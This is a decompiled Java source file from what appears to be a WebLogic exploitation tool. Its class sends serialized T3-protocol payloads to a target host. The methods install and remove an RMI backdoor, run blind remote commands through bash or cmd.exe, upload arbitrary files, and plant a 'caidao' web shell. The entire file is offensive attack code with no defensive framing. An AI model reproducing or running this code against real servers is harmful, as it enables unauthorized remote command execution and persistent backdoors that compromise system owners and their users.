package com.supeream.weblogic;

//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

import com.supeream.Main;
import com.supeream.serial.SerialDataGenerator;

public class WebLogicOperation {

    /**
     * install a backdoor rmi
     *
     * @param host
     * @param port
     * @throws Exception
     */
    public static void installRmi(String host, String port) throws Exception {
        byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"install"});
        T3ProtocolOperation.send(host, port, payload);
    }

    /**
     * remove the rmi backdoor
     *
     * @param host
     * @param port
     * @throws Exception
     */
    public static void unInstallRmi(String host, String port) throws Exception {
        byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"uninstall"});
        T3ProtocolOperation.send(host, port, payload);
    }

    /**
     * @param host
     * @param port
     * @throws Exception
     * @deprecated blind execute command
     */
    public static void blind(String host, String port) throws Exception {
        byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"blind", Main.cmdLine.getOptionValue("C")});
        T3ProtocolOperation.send(host, port, payload);
    }

    /**
     * upload a file
     *
     * @param host
     * @param port
     * @param filePath
     * @param content
     * @throws Exception
     */
    public static void uploadFile(String host, String port, String filePath, byte[] content) throws Exception {
        byte[] payload = SerialDataGenerator.serialUploadDatas(filePath, content);
        T3ProtocolOperation.send(host, port, payload);
    }

    /**
     * upload a default caidao backdoor
     *
     * @param host
     * @param port
     * @param fileName
     * @throws Exception
     */
    public static void uploadFileShell(String host, String port, String fileName) throws Exception {
        byte[] payload = SerialDataGenerator.serialUploadShellDatas(fileName);
        T3ProtocolOperation.send(host, port, payload);
    }

    /**
     * blind execute command
     * replace bind
     *
     * @param host
     * @param port
     * @param cmd
     * @throws Exception
     */
    public static void blindExecute(String host, String port, String cmd) throws Exception {
        String[] cmds = new String[]{cmd};
        if (Main.cmdLine.hasOption("os")) {
            if (Main.cmdLine.getOptionValue("os").equalsIgnoreCase("linux")) {
                cmds = new String[]{"/bin/bash", "-c", cmd};
            } else {
                cmds = new String[]{"cmd.exe", "/c", cmd};
            }
        }
        byte[] payload = SerialDataGenerator.serialBlindDatas(cmds);
        T3ProtocolOperation.send(host, port, payload);
    }

}
